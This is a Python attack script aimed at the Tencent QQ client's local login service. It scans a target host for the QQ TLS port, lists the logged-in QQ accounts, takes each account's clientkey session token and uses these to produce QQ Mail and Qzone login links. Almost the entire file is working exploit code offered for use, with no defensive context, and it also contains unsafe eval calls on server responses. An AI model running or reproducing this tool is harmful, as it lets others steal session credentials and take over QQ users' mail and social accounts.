import json
import math
import random
import socket
import traceback

import OpenSSL
from OpenSSL.SSL import Connection, Context, TLSv1_METHOD
import requests
import urllib3

urllib3.disable_warnings()

kQQVersionURL = 'https://im.qq.com/download/'
kTIMVersionURL = 'https://qzonestyle.gtimg.cn/qzone/qzactStatics/configSystem/data/1605/config1.js'

kDefaultHost = 'localhost.ptlogin2.qq.com'
kDefaultPortBase = 4301
kDefaultSURL = 'qq.com'
kDefaultUserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0'
kDefaultTimeout = 30000
kDefaultHttpListenPort = 8080

kFakeXuiHtmlPath = 'fakexui.html'

kProgressMsgInterval = 10000
kAssumeSuspicious = 5

kXUILoginURL = 'https://xui.ptlogin2.qq.com/cgi-bin/xlogin'

default_headers = {
    'accept': '*/*',
    'user-agent': kDefaultUserAgent
}


def getXUILoginURL(s_url):
    return f'{kXUILoginURL}?s_url={s_url or kDefaultSURL}'


def retrieveLocalToken():
    return rand(9999000000)


def rand(spec):
    return random.choice((1, -1)) * ((math.floor(
        random.random() * spec) if spec else random.random()) % 0x80000000 + 1000000)


def getUins(host=kDefaultHost, port=4303, local_token=retrieveLocalToken(), s_url=None,
            no_check_certificate=True,
            c=None):
    if not c:
        c = requests.cookies.RequestsCookieJar()
        c.set('pt_local_token', str(local_token), path='/', domain='ptlogin2.qq.com', secure=True)
    h = default_headers
    h.update({'host': kDefaultHost, 'referer': getXUILoginURL(s_url)})
    if port:
        ports = [port]
    else:
        ports = list(range(kDefaultPortBase, kDefaultPortBase + 20, 2))
    for port in ports:
        url = f'https://{host}:{port}/pt_get_uins?callback=ptui_getuins_CB&r={random.random()}&pt_local_tk={local_token}'
        # print(url)
        r = requests.get(url, headers=h, cookies=c, verify=no_check_certificate)
        uins = json.loads(r.text.split('=')[1].split(';')[0])
        return uins


def getClientKeyByUin(host=None, port=None, uins=None, local_token=None, s_url=None):
    c = requests.cookies.RequestsCookieJar()
    c.set('pt_local_token', str(local_token), path='/', domain='ptlogin2.qq.com', secure=True)
    h = default_headers
    h.update({'host': kDefaultHost, 'referer': getXUILoginURL(s_url)})
    req = requests.Session()
    l = []
    for i in uins:
        url = f"https://{host}:{port}/pt_get_st?clientuin={i['uin']}&callback=ptui_getst_CB&r={random.random()}&pt_local_tk={local_token}"
        # print(url)
        r = req.get(url, headers=h, cookies=c, verify=False)
        # print(r.text)
        clientkey = r.cookies.get_dict()['clientkey']
        l.append({'nickname': i['nickname'], 'qq': i['uin'], 'clientkey': clientkey})
        print('名称:' + i['nickname'], 'qq:' + str(i['uin']), 'clientkey:' + clientkey)
    return l


def scanForVulerabilities(host, start_port=4300, end_port=4320, timeout=1):
    for port in range(start_port, end_port):
        try:
            if getServerCertificate(host, port, timeout):
                print(f'[+] {port} 可利用')
                return port
            else:
                print(f'[+] {port} 不可利用')
        except socket.timeout:
            print('[-] %d 关闭' % port)
        except OpenSSL.SSL.SysCallError:
            print(f'[+] {port} 不可利用')
    print('该主机不存在漏洞')
    input()
    exit()


def getServerCertificate(ip, port, timeout):
    addr = (ip, port)
    sslcontext = Context(TLSv1_METHOD)
    sslcontext.set_timeout(30)
    print(f'[*] 正在扫描 {port}')
    s = socket.socket()
    s.settimeout(timeout)
    s.connect(addr)
    print(f'[+] {port} 打开')
    s.close()
    s = socket.socket()
    s.connect(addr)
    c = Connection(sslcontext, s)
    c.set_connect_state()
    c.do_handshake()
    cert = c.get_peer_certificate()
    c.shutdown()
    s.close()
    if cert.get_subject().get_components()[3][1].decode() == 'Shenzhen Tencent Computer Systems Company Limited':
        return True


def qqmail_login(qq, clientkey):
    url = f'http://ptlogin2.qq.com/jump?clientuin={qq}&clientkey={clientkey}&keyindex=9&u1=https%3A%2F%2Fmail.qq.com%2Fcgi-bin%2Flogin%3Fvt%3Dpassport%26vm%3Dwpt%26ft%3Dloginpage%26target%3D&pt_local_tk=&pt_3rd_aid=0&ptopt=1&style=25'
    r = requests.get(url)
    t = eval(r.text.split('ptui_qlogin_CB')[1])
    if t[0] == '0':
        print(f'获取{info["qq"]}的qq邮箱登录链接成功:' + t[1])
    else:
        print(f'获取{info["qq"]}的qq邮箱登录链接失败')


def qq_space(qq, clientkey):
    def hash33(clientkey):
        hash = 0
        for i in range(0, len(clientkey)):
            hash += (hash << 5) + ord(clientkey[i])
        return hash & 2147483647

    hash_clientkey = hash33(info['clientkey'])
    url = f'https://ssl.ptlogin2.qq.com/jump?clientuin={qq}&u1=https%3A%2F%2Fqzs.qzone.qq.com%2Fqzone%2Fv5%2Floginsucc.html%3Fpara%3Dizone&pt_local_tk={hash_clientkey}&ptopt=1'
    cookies = {'clientkey': clientkey}
    r = requests.get(url, cookies=cookies)
    t = eval(r.text.split('ptui_qlogin_CB')[1])
    if t[0] == '0':
        print(f'获取{qq}的qq空间登录链接成功:' + t[1])
    else:
        print(f'获取{qq}的qq空间登录链接失败')

if __name__ == '__main__':
    host = input('输入目标主机:')
    timeout = 1
    try:
        port = scanForVulerabilities(host, timeout=timeout)
        local_token = retrieveLocalToken()
        uins = getUins(host=host, port=port, no_check_certificate=False, local_token=local_token)
        # print(uins)
        l = getClientKeyByUin(host=host, port=port, uins=uins, local_token=local_token)
        for info in l:
            qq = info['qq']
            clientkey = info['clientkey']
            qqmail_login(qq, clientkey)
            qq_space(qq, clientkey)
    except:
        traceback.print_exc()
        input()
        exit()
    input()
